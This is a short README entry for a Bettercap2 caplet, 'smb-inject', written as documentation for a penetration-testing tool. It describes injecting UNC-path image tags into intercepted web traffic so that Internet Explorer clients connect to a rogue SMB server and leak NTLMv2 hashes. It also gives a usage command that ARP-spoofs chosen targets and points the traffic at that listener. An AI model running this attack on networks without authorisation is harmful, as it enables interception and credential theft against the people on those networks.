# Bettercap2 Caplets

### smb-inject.cap
__Description__: _Injects HTML image tags using UNC file path references (file://ip/smb.jpg). Forces clients rendering HTML in Internet Explorer, or applications using Windows IE objects, to connect to your SMB server. Run a rogue SMB server to capture NTLMv2 hashes_
<br>__Related JS__: smb-inject.js
<br>__Usage__:
`bettercap -caplet smb-inject.cap -eval "set arp.spoof.targets IP; set smb.listener.ip SMB.Server.IP"`
<br>__smb.listener.ip__ is the IP to your rogue SMB server
<br>__arp.spoof.targets__ is the IP (single or CIDR notation) of the range to poison/spoof

